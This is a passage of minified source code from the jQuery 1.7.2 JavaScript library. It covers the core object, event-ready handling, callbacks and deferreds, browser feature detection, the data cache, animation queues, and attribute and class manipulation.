d=b+"defer",e=b+"queue",g=b+"mark",h=f._data(a,d);h&&(c==="queue"||!f._data(a,e))&&(c==="mark"||!f._data(a,g))&&setTimeout(function(){!f._data(a,e)&&!f._data(a,g)&&(f.removeData(a,d,!0),h.fire())},0)}function m(a){for(var b in a){if(b==="data"&&f.isEmptyObject(a[b]))continue;if(b!=="toJSON")return!1}return!0}function l(a,c,d){if(d===b&&a.nodeType===1){var e="data-"+c.replace(k,"-$1").toLowerCase();d=a.getAttribute(e);if(typeof d=="string"){try{d=d==="true"?!0:d==="false"?!1:d==="null"?null:f.isNumeric(d)?+d:j.test(d)?f.parseJSON(d):d}catch(g){}f.data(a,c,d)}else d=b}return d}function h(a){var b=g[a]={},c,d;a=a.split(/\s+/);for(c=0,d=a.length;c<d;c++)b[a[c]]=!0;return b}var c=a.document,d=a.navigator,e=a.location,f=function(){function J(){if(!e.isReady){try{c.documentElement.doScroll("left")}catch(a){setTimeout(J,1);return}e.ready()}}var e=function(a,b){return new e.fn.init(a,b,h)},f=a.jQuery,g=a.$,h,i=/^(?:[^#<]*(<[\w\W]+>)[^>]*$|#([\w\-]*)$)/,j=/\S/,k=/^\s+/,l=/\s+$/,m=/^<(\w+)\s*\/?>(?:<\/\1>)?$/,n=/^[\],:{}\s]*$/,o=/\\(?:["\\\/bfnrt]|u[0-9a-fA-F]{4})/g,p=/"[^"\\\n\r]*"|true|false|null|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?/g,q=/(?:^|:|,)(?:\s*\[)+/g,r=/(webkit)[ \/]([\w.]+)/,s=/(opera)(?:.*version)?[ \/]([\w.]+)/,t=/(msie) ([\w.]+)/,u=/(mozilla)(?:.*? rv:([\w.]+))?/,v=/-([a-z]|[0-9])/ig,w=/^-ms-/,x=function(a,b){return(b+"").toUpperCase()},y=d.userAgent,z,A,B,C=Object.prototype.toString,D=Object.prototype.hasOwnProperty,E=Array.prototype.push,F=Array.prototype.slice,G=String.prototype.trim,H=Array.prototype.indexOf,I={};e.fn=e.prototype={constructor:e,init:function(a,d,f){var g,h,j,k;if(!a)return this;if(a.nodeType){this.context=this[0]=a,this.length=1;return this}if(a==="body"&&!d&&c.body){this.context=c,this[0]=c.body,this.selector=a,this.length=1;return this}if(typeof a=="string"){a.charAt(0)!=="<"||a.charAt(a.length-1)!==">"||a.length<3?g=i.exec(a):g=[null,a,null];if(g&&(g[1]||!d)){if(g[1]){d=d instanceof e?d[0]:d,k=d?d.ownerDocument||d:c,j=m.exec(a),j?e.isPlainObject(d)?(a=[c.createElement(j[1])],e.fn.attr.call(a,d,!0)):a=[k.createElement(j[1])]:(j=e.buildFragment([g[1]],[k]),a=(j.cacheable?e.clone(j.fragment):j.fragment).childNodes);return e.merge(this,a)}h=c.getElementById(g[2]);if(h&&h.parentNode){if(h.id!==g[2])return f.find(a);this.length=1,this[0]=h}this.context=c,this.selector=a;return this}return!d||d.jquery?(d||f).find(a):this.constructor(d).find(a)}if(e.isFunction(a))return f.ready(a);a.selector!==b&&(this.selector=a.selector,this.context=a.context);return e.makeArray(a,this)},selector:"",jquery:"1.7.2",length:0,size:function(){return this.length},toArray:function(){return F.call(this,0)},get:function(a){return a==null?this.toArray():a<0?this[this.length+a]:this[a]},pushStack:function(a,b,c){var d=this.constructor();e.isArray(a)?E.apply(d,a):e.merge(d,a),d.prevObject=this,d.context=this.context,b==="find"?d.selector=this.selector+(this.selector?" ":"")+c:b&&(d.selector=this.selector+"."+b+"("+c+")");return d},each:function(a,b){return e.each(this,a,b)},ready:function(a){e.bindReady(),A.add(a);return this},eq:function(a){a=+a;return a===-1?this.slice(a):this.slice(a,a+1)},first:function(){return this.eq(0)},last:function(){return this.eq(-1)},slice:function(){return this.pushStack(F.apply(this,arguments),"slice",F.call(arguments).join(","))},map:function(a){return this.pushStack(e.map(this,function(b,c){return a.call(b,c,b)}))},end:function(){return this.prevObject||this.constructor(null)},push:E,sort:[].sort,splice:[].splice},e.fn.init.prototype=e.fn,e.extend=e.fn.extend=function(){var a,c,d,f,g,h,i=arguments[0]||{},j=1,k=arguments.length,l=!1;typeof i=="boolean"&&(l=i,i=arguments[1]||{},j=2),typeof i!="object"&&!e.isFunction(i)&&(i={}),k===j&&(i=this,--j);for(;j<k;j++)if((a=arguments[j])!=null)for(c in a){d=i[c],f=a[c];if(i===f)continue;l&&f&&(e.isPlainObject(f)||(g=e.isArray(f)))?(g?(g=!1,h=d&&e.isArray(d)?d:[]):h=d&&e.isPlainObject(d)?d:{},i[c]=e.extend(l,h,f)):f!==b&&(i[c]=f)}return i},e.extend({noConflict:function(b){a.$===e&&(a.$=g),b&&a.jQuery===e&&(a.jQuery=f);return e},isReady:!1,readyWait:1,holdReady:function(a){a?e.readyWait++:e.ready(!0)},ready:function(a){if(a===!0&&!--e.readyWait||a!==!0&&!e.isReady){if(!c.body)return setTimeout(e.ready,1);e.isReady=!0;if(a!==!0&&--e.readyWait>0)return;A.fireWith(c,[e]),e.fn.trigger&&e(c).trigger("ready").off("ready")}},bindReady:function(){if(!A){A=e.Callbacks("once memory");if(c.readyState==="complete")return setTimeout(e.ready,1);if(c.addEventListener)c.addEventListener("DOMContentLoaded",B,!1),a.addEventListener("load",e.ready,!1);else if(c.attachEvent){c.attachEvent("onreadystatechange",B),a.attachEvent("onload",e.ready);var b=!1;try{b=a.frameElement==null}catch(d){}c.documentElement.doScroll&&b&&J()}}},isFunction:function(a){return e.type(a)==="function"},isArray:Array.isArray||function(a){return e.type(a)==="array"},isWindow:function(a){return a!=null&&a==a.window},isNumeric:function(a){return!isNaN(parseFloat(a))&&isFinite(a)},type:function(a){return a==null?String(a):I[C.call(a)]||"object"},isPlainObject:function(a){if(!a||e.type(a)!=="object"||a.nodeType||e.isWindow(a))return!1;try{if(a.constructor&&!D.call(a,"constructor")&&!D.call(a.constructor.prototype,"isPrototypeOf"))return!1}catch(c){return!1}var d;for(d in a);return d===b||D.call(a,d)},isEmptyObject:function(a){for(var b in a)return!1;return!0},error:function(a){throw new Error(a)},parseJSON:function(b){if(typeof b!="string"||!b)return null;b=e.trim(b);if(a.JSON&&a.JSON.parse)return a.JSON.parse(b);if(n.test(b.replace(o,"@").replace(p,"]").replace(q,"")))return(new Function("return "+b))();e.error("Invalid JSON: "+b)},parseXML:function(c){if(typeof c!="string"||!c)return null;var d,f;try{a.DOMParser?(f=new DOMParser,d=f.parseFromString(c,"text/xml")):(d=new ActiveXObject("Microsoft.XMLDOM"),d.async="false",d.loadXML(c))}catch(g){d=b}(!d||!d.documentElement||d.getElementsByTagName("parsererror").length)&&e.error("Invalid XML: "+c);return d},noop:function(){},globalEval:function(b){b&&j.test(b)&&(a.execScript||function(b){a.eval.call(a,b)})(b)},camelCase:function(a){return a.replace(w,"ms-").replace(v,x)},nodeName:function(a,b){return a.nodeName&&a.nodeName.toUpperCase()===b.toUpperCase()},each:function(a,c,d){var f,g=0,h=a.length,i=h===b||e.isFunction(a);if(d){if(i){for(f in a)if(c.apply(a[f],d)===!1)break}else for(;g<h;)if(c.apply(a[g++],d)===!1)break}else if(i){for(f in a)if(c.call(a[f],f,a[f])===!1)break}else for(;g<h;)if(c.call(a[g],g,a[g++])===!1)break;return a},trim:G?function(a){return a==null?"":G.call(a)}:function(a){return a==null?"":(a+"").replace(k,"").replace(l,"")},makeArray:function(a,b){var c=b||[];if(a!=null){var d=e.type(a);a.length==null||d==="string"||d==="function"||d==="regexp"||e.isWindow(a)?E.call(c,a):e.merge(c,a)}return c},inArray:function(a,b,c){var d;if(b){if(H)return H.call(b,a,c);d=b.length,c=c?c<0?Math.max(0,d+c):c:0;for(;c<d;c++)if(c in b&&b[c]===a)return c}return-1},merge:function(a,c){var d=a.length,e=0;if(typeof c.length=="number")for(var f=c.length;e<f;e++)a[d++]=c[e];else while(c[e]!==b)a[d++]=c[e++];a.length=d;return a},grep:function(a,b,c){var d=[],e;c=!!c;for(var f=0,g=a.length;f<g;f++)e=!!b(a[f],f),c!==e&&d.push(a[f]);return d},map:function(a,c,d){var f,g,h=[],i=0,j=a.length,k=a instanceof e||j!==b&&typeof j=="number"&&(j>0&&a[0]&&a[j-1]||j===0||e.isArray(a));if(k)for(;i<j;i++)f=c(a[i],i,d),f!=null&&(h[h.length]=f);else for(g in a)f=c(a[g],g,d),f!=null&&(h[h.length]=f);return h.concat.apply([],h)},guid:1,proxy:function(a,c){if(typeof c=="string"){var d=a[c];c=a,a=d}if(!e.isFunction(a))return b;var f=F.call(arguments,2),g=function(){return a.apply(c,f.concat(F.call(arguments)))};g.guid=a.guid=a.guid||g.guid||e.guid++;return g},access:function(a,c,d,f,g,h,i){var j,k=d==null,l=0,m=a.length;if(d&&typeof d=="object"){for(l in d)e.access(a,c,l,d[l],1,h,f);g=1}else if(f!==b){j=i===b&&e.isFunction(f),k&&(j?(j=c,c=function(a,b,c){return j.call(e(a),c)}):(c.call(a,f),c=null));if(c)for(;l<m;l++)c(a[l],d,j?f.call(a[l],l,c(a[l],d)):f,i);g=1}return g?a:k?c.call(a):m?c(a[0],d):h},now:function(){return(new Date).getTime()},uaMatch:function(a){a=a.toLowerCase();var b=r.exec(a)||s.exec(a)||t.exec(a)||a.indexOf("compatible")<0&&u.exec(a)||[];return{browser:b[1]||"",version:b[2]||"0"}},sub:function(){function a(b,c){return new a.fn.init(b,c)}e.extend(!0,a,this),a.superclass=this,a.fn=a.prototype=this(),a.fn.constructor=a,a.sub=this.sub,a.fn.init=function(d,f){f&&f instanceof e&&!(f instanceof a)&&(f=a(f));return e.fn.init.call(this,d,f,b)},a.fn.init.prototype=a.fn;var b=a(c);return a},browser:{}}),e.each("Boolean Number String Function Array Date RegExp Object".split(" "),function(a,b){I["[object "+b+"]"]=b.toLowerCase()}),z=e.uaMatch(y),z.browser&&(e.browser[z.browser]=!0,e.browser.version=z.version),e.browser.webkit&&(e.browser.safari=!0),j.test(" ")&&(k=/^[\s\xA0]+/,l=/[\s\xA0]+$/),h=e(c),c.addEventListener?B=function(){c.removeEventListener("DOMContentLoaded",B,!1),e.ready()}:c.attachEvent&&(B=function(){c.readyState==="complete"&&(c.detachEvent("onreadystatechange",B),e.ready())});return e}(),g={};f.Callbacks=function(a){a=a?g[a]||h(a):{};var c=[],d=[],e,i,j,k,l,m,n=function(b){var d,e,g,h,i;for(d=0,e=b.length;d<e;d++)g=b[d],h=f.type(g),h==="array"?n(g):h==="function"&&(!a.unique||!p.has(g))&&c.push(g)},o=function(b,f){f=f||[],e=!a.memory||[b,f],i=!0,j=!0,m=k||0,k=0,l=c.length;for(;c&&m<l;m++)if(c[m].apply(b,f)===!1&&a.stopOnFalse){e=!0;break}j=!1,c&&(a.once?e===!0?p.disable():c=[]:d&&d.length&&(e=d.shift(),p.fireWith(e[0],e[1])))},p={add:function(){if(c){var a=c.length;n(arguments),j?l=c.length:e&&e!==!0&&(k=a,o(e[0],e[1]))}return this},remove:function(){if(c){var b=arguments,d=0,e=b.length;for(;d<e;d++)for(var f=0;f<c.length;f++)if(b[d]===c[f]){j&&f<=l&&(l--,f<=m&&m--),c.splice(f--,1);if(a.unique)break}}return this},has:function(a){if(c){var b=0,d=c.length;for(;b<d;b++)if(a===c[b])return!0}return!1},empty:function(){c=[];return this},disable:function(){c=d=e=b;return this},disabled:function(){return!c},lock:function(){d=b,(!e||e===!0)&&p.disable();return this},locked:function(){return!d},fireWith:function(b,c){d&&(j?a.once||d.push([b,c]):(!a.once||!e)&&o(b,c));return this},fire:function(){p.fireWith(this,arguments);return this},fired:function(){return!!i}};return p};var i=[].slice;f.extend({Deferred:function(a){var b=f.Callbacks("once memory"),c=f.Callbacks("once memory"),d=f.Callbacks("memory"),e="pending",g={resolve:b,reject:c,notify:d},h={done:b.add,fail:c.add,progress:d.add,state:function(){return e},isResolved:b.fired,isRejected:c.fired,then:function(a,b,c){i.done(a).fail(b).progress(c);return this},always:function(){i.done.apply(i,arguments).fail.apply(i,arguments);return this},pipe:function(a,b,c){return f.Deferred(function(d){f.each({done:[a,"resolve"],fail:[b,"reject"],progress:[c,"notify"]},function(a,b){var c=b[0],e=b[1],g;f.isFunction(c)?i[a](function(){g=c.apply(this,arguments),g&&f.isFunction(g.promise)?g.promise().then(d.resolve,d.reject,d.notify):d[e+"With"](this===i?d:this,[g])}):i[a](d[e])})}).promise()},promise:function(a){if(a==null)a=h;else for(var b in h)a[b]=h[b];return a}},i=h.promise({}),j;for(j in g)i[j]=g[j].fire,i[j+"With"]=g[j].fireWith;i.done(function(){e="resolved"},c.disable,d.lock).fail(function(){e="rejected"},b.disable,d.lock),a&&a.call(i,i);return i},when:function(a){function m(a){return function(b){e[a]=arguments.length>1?i.call(arguments,0):b,j.notifyWith(k,e)}}function l(a){return function(c){b[a]=arguments.length>1?i.call(arguments,0):c,--g||j.resolveWith(j,b)}}var b=i.call(arguments,0),c=0,d=b.length,e=Array(d),g=d,h=d,j=d<=1&&a&&f.isFunction(a.promise)?a:f.Deferred(),k=j.promise();if(d>1){for(;c<d;c++)b[c]&&b[c].promise&&f.isFunction(b[c].promise)?b[c].promise().then(l(c),j.reject,m(c)):--g;g||j.resolveWith(j,b)}else j!==a&&j.resolveWith(j,d?[a]:[]);return k}}),f.support=function(){var b,d,e,g,h,i,j,k,l,m,n,o,p=c.createElement("div"),q=c.documentElement;p.setAttribute("className","t"),p.innerHTML="   <link/><table></table><a href='/a' style='top:1px;float:left;opacity:.55;'>a</a><input type='checkbox'/>",d=p.getElementsByTagName("*"),e=p.getElementsByTagName("a")[0];if(!d||!d.length||!e)return{};g=c.createElement("select"),h=g.appendChild(c.createElement("option")),i=p.getElementsByTagName("input")[0],b={leadingWhitespace:p.firstChild.nodeType===3,tbody:!p.getElementsByTagName("tbody").length,htmlSerialize:!!p.getElementsByTagName("link").length,style:/top/.test(e.getAttribute("style")),hrefNormalized:e.getAttribute("href")==="/a",opacity:/^0.55/.test(e.style.opacity),cssFloat:!!e.style.cssFloat,checkOn:i.value==="on",optSelected:h.selected,getSetAttribute:p.className!=="t",enctype:!!c.createElement("form").enctype,html5Clone:c.createElement("nav").cloneNode(!0).outerHTML!=="<:nav></:nav>",submitBubbles:!0,changeBubbles:!0,focusinBubbles:!1,deleteExpando:!0,noCloneEvent:!0,inlineBlockNeedsLayout:!1,shrinkWrapBlocks:!1,reliableMarginRight:!0,pixelMargin:!0},f.boxModel=b.boxModel=c.compatMode==="CSS1Compat",i.checked=!0,b.noCloneChecked=i.cloneNode(!0).checked,g.disabled=!0,b.optDisabled=!h.disabled;try{delete p.test}catch(r){b.deleteExpando=!1}!p.addEventListener&&p.attachEvent&&p.fireEvent&&(p.attachEvent("onclick",function(){b.noCloneEvent=!1}),p.cloneNode(!0).fireEvent("onclick")),i=c.createElement("input"),i.value="t",i.setAttribute("type","radio"),b.radioValue=i.value==="t",i.setAttribute("checked","checked"),i.setAttribute("name","t"),p.appendChild(i),j=c.createDocumentFragment(),j.appendChild(p.lastChild),b.checkClone=j.cloneNode(!0).cloneNode(!0).lastChild.checked,b.appendChecked=i.checked,j.removeChild(i),j.appendChild(p);if(p.attachEvent)for(n in{submit:1,change:1,focusin:1})m="on"+n,o=m in p,o||(p.setAttribute(m,"return;"),o=typeof p[m]=="function"),b[n+"Bubbles"]=o;j.removeChild(p),j=g=h=p=i=null,f(function(){var d,e,g,h,i,j,l,m,n,q,r,s,t,u=c.getElementsByTagName("body")[0];!u||(m=1,t="padding:0;margin:0;border:",r="position:absolute;top:0;left:0;width:1px;height:1px;",s=t+"0;visibility:hidden;",n="style='"+r+t+"5px solid #000;",q="<div "+n+"display:block;'><div style='"+t+"0;display:block;overflow:hidden;'></div></div>"+"<table "+n+"' cellpadding='0' cellspacing='0'>"+"<tr><td></td></tr></table>",d=c.createElement("div"),d.style.cssText=s+"width:0;height:0;position:static;top:0;margin-top:"+m+"px",u.insertBefore(d,u.firstChild),p=c.createElement("div"),d.appendChild(p),p.innerHTML="<table><tr><td style='"+t+"0;display:none'></td><td>t</td></tr></table>",k=p.getElementsByTagName("td"),o=k[0].offsetHeight===0,k[0].style.display="",k[1].style.display="none",b.reliableHiddenOffsets=o&&k[0].offsetHeight===0,a.getComputedStyle&&(p.innerHTML="",l=c.createElement("div"),l.style.width="0",l.style.marginRight="0",p.style.width="2px",p.appendChild(l),b.reliableMarginRight=(parseInt((a.getComputedStyle(l,null)||{marginRight:0}).marginRight,10)||0)===0),typeof p.style.zoom!="undefined"&&(p.innerHTML="",p.style.width=p.style.padding="1px",p.style.border=0,p.style.overflow="hidden",p.style.display="inline",p.style.zoom=1,b.inlineBlockNeedsLayout=p.offsetWidth===3,p.style.display="block",p.style.overflow="visible",p.innerHTML="<div style='width:5px;'></div>",b.shrinkWrapBlocks=p.offsetWidth!==3),p.style.cssText=r+s,p.innerHTML=q,e=p.firstChild,g=e.firstChild,i=e.nextSibling.firstChild.firstChild,j={doesNotAddBorder:g.offsetTop!==5,doesAddBorderForTableAndCells:i.offsetTop===5},g.style.position="fixed",g.style.top="20px",j.fixedPosition=g.offsetTop===20||g.offsetTop===15,g.style.position=g.style.top="",e.style.overflow="hidden",e.style.position="relative",j.subtractsBorderForOverflowNotVisible=g.offsetTop===-5,j.doesNotIncludeMarginInBodyOffset=u.offsetTop!==m,a.getComputedStyle&&(p.style.marginTop="1%",b.pixelMargin=(a.getComputedStyle(p,null)||{marginTop:0}).marginTop!=="1%"),typeof d.style.zoom!="undefined"&&(d.style.zoom=1),u.removeChild(d),l=p=d=null,f.extend(b,j))});return b}();var j=/^(?:\{.*\}|\[.*\])$/,k=/([A-Z])/g;f.extend({cache:{},uuid:0,expando:"jQuery"+(f.fn.jquery+Math.random()).replace(/\D/g,""),noData:{embed:!0,object:"clsid:D27CDB6E-AE6D-11cf-96B8-444553540000",applet:!0},hasData:function(a){a=a.nodeType?f.cache[a[f.expando]]:a[f.expando];return!!a&&!m(a)},data:function(a,c,d,e){if(!!f.acceptData(a)){var g,h,i,j=f.expando,k=typeof c=="string",l=a.nodeType,m=l?f.cache:a,n=l?a[j]:a[j]&&j,o=c==="events";if((!n||!m[n]||!o&&!e&&!m[n].data)&&k&&d===b)return;n||(l?a[j]=n=++f.uuid:n=j),m[n]||(m[n]={},l||(m[n].toJSON=f.noop));if(typeof c=="object"||typeof c=="function")e?m[n]=f.extend(m[n],c):m[n].data=f.extend(m[n].data,c);g=h=m[n],e||(h.data||(h.data={}),h=h.data),d!==b&&(h[f.camelCase(c)]=d);if(o&&!h[c])return g.events;k?(i=h[c],i==null&&(i=h[f.camelCase(c)])):i=h;return i}},removeData:function(a,b,c){if(!!f.acceptData(a)){var d,e,g,h=f.expando,i=a.nodeType,j=i?f.cache:a,k=i?a[h]:h;if(!j[k])return;if(b){d=c?j[k]:j[k].data;if(d){f.isArray(b)||(b in d?b=[b]:(b=f.camelCase(b),b in d?b=[b]:b=b.split(" ")));for(e=0,g=b.length;e<g;e++)delete d[b[e]];if(!(c?m:f.isEmptyObject)(d))return}}if(!c){delete j[k].data;if(!m(j[k]))return}f.support.deleteExpando||!j.setInterval?delete j[k]:j[k]=null,i&&(f.support.deleteExpando?delete a[h]:a.removeAttribute?a.removeAttribute(h):a[h]=null)}},_data:function(a,b,c){return f.data(a,b,c,!0)},acceptData:function(a){if(a.nodeName){var b=f.noData[a.nodeName.toLowerCase()];if(b)return b!==!0&&a.getAttribute("classid")===b}return!0}}),f.fn.extend({data:function(a,c){var d,e,g,h,i,j=this[0],k=0,m=null;if(a===b){if(this.length){m=f.data(j);if(j.nodeType===1&&!f._data(j,"parsedAttrs")){g=j.attributes;for(i=g.length;k<i;k++)h=g[k].name,h.indexOf("data-")===0&&(h=f.camelCase(h.substring(5)),l(j,h,m[h]));f._data(j,"parsedAttrs",!0)}}return m}if(typeof a=="object")return this.each(function(){f.data(this,a)});d=a.split(".",2),d[1]=d[1]?"."+d[1]:"",e=d[1]+"!";return f.access(this,function(c){if(c===b){m=this.triggerHandler("getData"+e,[d[0]]),m===b&&j&&(m=f.data(j,a),m=l(j,a,m));return m===b&&d[1]?this.data(d[0]):m}d[1]=c,this.each(function(){var b=f(this);b.triggerHandler("setData"+e,d),f.data(this,a,c),b.triggerHandler("changeData"+e,d)})},null,c,arguments.length>1,null,!1)},removeData:function(a){return this.each(function(){f.removeData(this,a)})}}),f.extend({_mark:function(a,b){a&&(b=(b||"fx")+"mark",f._data(a,b,(f._data(a,b)||0)+1))},_unmark:function(a,b,c){a!==!0&&(c=b,b=a,a=!1);if(b){c=c||"fx";var d=c+"mark",e=a?0:(f._data(b,d)||1)-1;e?f._data(b,d,e):(f.removeData(b,d,!0),n(b,c,"mark"))}},queue:function(a,b,c){var d;if(a){b=(b||"fx")+"queue",d=f._data(a,b),c&&(!d||f.isArray(c)?d=f._data(a,b,f.makeArray(c)):d.push(c));return d||[]}},dequeue:function(a,b){b=b||"fx";var c=f.queue(a,b),d=c.shift(),e={};d==="inprogress"&&(d=c.shift()),d&&(b==="fx"&&c.unshift("inprogress"),f._data(a,b+".run",e),d.call(a,function(){f.dequeue(a,b)},e)),c.length||(f.removeData(a,b+"queue "+b+".run",!0),n(a,b,"queue"))}}),f.fn.extend({queue:function(a,c){var d=2;typeof a!="string"&&(c=a,a="fx",d--);if(arguments.length<d)return f.queue(this[0],a);return c===b?this:this.each(function(){var b=f.queue(this,a,c);a==="fx"&&b[0]!=="inprogress"&&f.dequeue(this,a)})},dequeue:function(a){return this.each(function(){f.dequeue(this,a)})},delay:function(a,b){a=f.fx?f.fx.speeds[a]||a:a,b=b||"fx";return this.queue(b,function(b,c){var d=setTimeout(b,a);c.stop=function(){clearTimeout(d)}})},clearQueue:function(a){return this.queue(a||"fx",[])},promise:function(a,c){function m(){--h||d.resolveWith(e,[e])}typeof a!="string"&&(c=a,a=b),a=a||"fx";var d=f.Deferred(),e=this,g=e.length,h=1,i=a+"defer",j=a+"queue",k=a+"mark",l;while(g--)if(l=f.data(e[g],i,b,!0)||(f.data(e[g],j,b,!0)||f.data(e[g],k,b,!0))&&f.data(e[g],i,f.Callbacks("once memory"),!0))h++,l.add(m);m();return d.promise(c)}});var o=/[\n\t\r]/g,p=/\s+/,q=/\r/g,r=/^(?:button|input)$/i,s=/^(?:button|input|object|select|textarea)$/i,t=/^a(?:rea)?$/i,u=/^(?:autofocus|autoplay|async|checked|controls|defer|disabled|hidden|loop|multiple|open|readonly|required|scoped|selected)$/i,v=f.support.getSetAttribute,w,x,y;f.fn.extend({attr:function(a,b){return f.access(this,f.attr,a,b,arguments.length>1)},removeAttr:function(a){return this.each(function(){f.removeAttr(this,a)})},prop:function(a,b){return f.access(this,f.prop,a,b,arguments.length>1)},removeProp:function(a){a=f.propFix[a]||a;return this.each(function(){try{this[a]=b,delete this[a]}catch(c){}})},addClass:function(a){var b,c,d,e,g,h,i;if(f.isFunction(a))return this.each(function(b){f(this).addClass(a.call(this,b,this.className))});if(a&&typeof a=="string"){b=a.split(p);for(c=0,d=this.length;c<d;c++){e=this[c];if(e.nodeType===1)if(!e.className&&b.length===1)e.className=a;else{g=" "+e.className+" ";for(h=0,i=b.length;h<i;h++)~g.indexOf(" "+b[h]+" ")||(g+=b[h]+" ");e.className=f.trim(g)}}}return this},removeClass:function(a){var c,d,e,g,h,i,j;if(f.isFunction(a))return this.each(function(b){f(this).removeClass(a.call(this,b,this.className))});if(a&&typeof a=="string"||a===b){c=(a||"").split(p);for(d=0,e=this.length;d<e;d++){g=this[d];if(g.nodeType===1&&g.className)if(a){h=(" "+g.className+" ").replace(o," ");for(i=0,j=c.length;i<j;i++)h=h.replace(" "+c[i]+" "," ");g.className=f.trim(h)}else g.className=""}}return this},toggleClass:function(a,b){var c=typeof a,d=typeof b=="boolean";if(f.isFunction(a))return this.each(function(c){f(this).toggleClass(a.call(this,c,this.className,b),b)});return this.each(function(){if(c==="string"){var e,g=0,h=f(this),i=b,j=a.split(p);while(e=j[g++])i=d?i:!h.hasClass(e),h[i?"addClass":"removeClass"](e)}else if(c==="undefined"||c==="boolean")this.className&&f._data(this,"__className__",this.className),this.className=this.className||a===!1?"":f._data(this,"__className__")||""})},hasClass:function(a){var b=" "+a+" ",c=0,d=this.length;for(;c<d;c++)if(this[c].nodeType===1&&(" "+this[c].className+" ").replace(o," ").indexOf(b)>-1)return!0;return!1},val:function(a){var c,d,e,g=this[0];{if(!!arguments.length){e=f.isFunction(a);return this.each(function(d){var g=f(this),h;if(this.nodeType===1){e?h=a.call(this,d,g.val()):h=a,h==null?h="":typeof h=="number"?h+="":f.isArray(h)&&(h=f.map(h,function(a){return a==null?"":a+""})),c=f.valHooks[this.type]||f.valHooks[this.nodeName.toLowerCase()];if(!c||!("set"in c)||c.set(this,h,"value")===b)this.value=h}})}if(g){c=f.valHooks[g.type]||f.valHooks[g.nodeName.toLowerCase()];if(c&&"get"in c&&(d=c.get(g,"value"))!==b)return d;d=g.value;return typeof d=="string"?d.replace(q,""):d==null?"":d}}}}),f.extend({valHooks:{option:{get:function(a){var b=a.attributes.value;return!b||b.specified?a.value:a.text}},select:{get:function(a){var b,c,d,e,g=a.selectedIndex,h=[],i=a.options,j=a.type==="select-one";if(g<0)return null;c=j?g:0,d=j?g+1:i.length;for(;c<d;c++){e=i[c];if(e.selected&&(f.support.optDisabled?!e.disabled:e.getAttribute("disabled")===null)&&(!e.parentNode.disabled||!f.nodeName(e.parentNode,"optgroup"))){b=f(e).val();if(j)return b;h.push(b)}}if(j&&!h.length&&i.length)return f(i[g]).val();return h},set:function(a,b){var c=f.makeArray(b);f(a).find("option").each(function(){this.selected=f.inArray(f(this).val(),c)>=0}),c.length||(a.selectedIndex=-1);return c}}},attrFn:{val:!0,css:!0,html:!0,text:!0,data:!0,width:!0,height:!0,offset:!0},attr:function(a,c,d,e){var g,h,i,j=a.nodeType;if(!!a&&j!==3&&j!==8&&j!==2){if(e&&c in f.attrFn)return f(a)[c](d);if(typeof a.getAttribute=="undefined")return f.prop(a,c,d);i=j!==1||!f.isXMLDoc(a),i&&(c=c.toLowerCase(),h=f.attrHooks[c]||(u.test(c)?x:w));if(d!==b){if(d===null){f.removeAttr(a,c);return}if(h&&"set"in h&&i&&(g=h.set(a,d,c))!==b)return g;a.setAttribute(c,""+d);return d}if(h&&"get"in h&&i&&(g=h.get(a,c))!==null)return g;g=a.getAttribute(c);return g===null?b:g}},removeAttr:function(a,b){var c,d,e,g,h,i=0;if(b&&a.nodeType===1){d=b.toLowerCase().split(p),g=d.length;for(;i<g;i++)e=d[i],e&&(c=f.propFix[e]||e,h=u.test(e),h||f.attr(a,e,""),a.removeAttribute(v?e:c),h&&c in a&&(a[c]=!1))}},attrHooks:{type:{set:function(a,b){if(r.test(a.nodeName)&&a.parentNode)f.error("type property can't be changed");else if(!f.support.radioValue&&b==="radio"&&f.nodeName(a,"input")){var c=a.value;a.setAttribute("type",b),c&&(a.value=c);return b}}},value:{get:function(a,b){if(w&&f.nodeName(a,"button"))return w.get(a,b);return b in a?a.value:null},set:function(a,b,c){if(w&&f.nodeName(a,"button"))return w.set(a,b,c);a.value=b}}},propFix:{tabindex:"tabIndex",readonly:"readOnly","for":"htmlFor","class":"className",maxlength:"maxLength",cellspacing:"cellSpacing",cellpadding:"cellPadding",rowspan:"rowSpan",colspan:"colSpan",usemap:"useMap",frameborder:"frameBorder",contenteditable:"contentEditable"},prop:function(a,c,d){var e,g,h,i=a.nodeType;if(!!a&&i!==3&&i!==8&&i!==2){h=i!==1||!f.isXMLDoc(a),h&&(c=f.propFix[c]||c,g=f.propHooks[c]);return d!==b?g&&"set"in g&&(e=g.set(a,d,c))!==b?e:a[c]=d:g&&"get"in g&&(e=g.get(a,c))!==null?e:a[c]}},propHooks:{tabIndex:{get:function(a){var c=a.getAttributeNode("tabindex");return c&&c.specified?parseInt(c.value,10):s.test(a.nodeName)||t.test(a.nodeName)&&a.href?0:b}}}}),f.attrHooks.tabindex=f.propHooks.tabIndex,x={get:function(a,c){var d,e=f.prop(a,c);return e===!0||typeof e!="boolean"&&(d=a.getAttributeNode(c))&&d.nodeValue!==!1?c.toLowerCase():b},set:function(a,b,c){var d;b===!1?f.removeAttr(a,c):(d=f.propFix[c]||c,d in a&&(a[d]=!0),a.setAttribute(c,c.toLowerCase()));return c}},v||(y={name:!0,id:!0,coords:!0},w=f.valHooks.button={get:function(a,c){var d;d=a.getAttributeNode(c);return d&&(y[c]?d.nodeValue!=="":d.specified)?d.nodeValue:b},set:function(a,b,d){var e=a.getAttributeNode(d);e||(e=c.createAttribute(d),a.setAttributeNode(e));return e.nodeValue=b+""}},f.attrHooks.tabindex.set=w.set,f.each(["width","height"],function(a,b){f.attrHooks[b]=f.extend(f.attrHooks[b],{set:function(a,c){if(c===""){a.setAttribute(b,"auto");return c}}})}),f.attrHooks.contenteditable={get:w.get,set:function(a,b,c){b===""&&(b="false"),w.set(a,b,c)}}),f.support.hrefNormalized||f.each(["href","src","width","height"],function(a,c){f.attrHooks[c]=f.extend(f.attrHooks[c],{get:function(a){var d=a.getAttribute(c,2);return d===null?b:d}})}),f.support.style||(f.attrHooks.style={get:function(a){return a.style.cssText.toLowerCase()||b},set:function(a,b){return a.style.cssText=""+b}}),f.support.optSelected||(f.propHooks.selected=f.extend(f.propHooks.selected,{get:function(a){var b=a.parentNode;b&&(b.selectedIndex,b.parentNode&&b.parentNode.selectedIndex);return null}})),f.support.enctype||(f.propFix.enctype="encoding"),f.support.checkOn||f.each(["radio","checkbox"],function(){f.valHooks[this]={get:function(a){return a.getAttribute("value")===null?"on":a.value}}}),f.each(["radio","checkbox"],function(){f.valHooks[this]=f.extend(f.valHooks[this],{set:function(a,b){if(f.isArray(b))return a.checked=f.inArray(f(a).val(),b)>=0}})});var 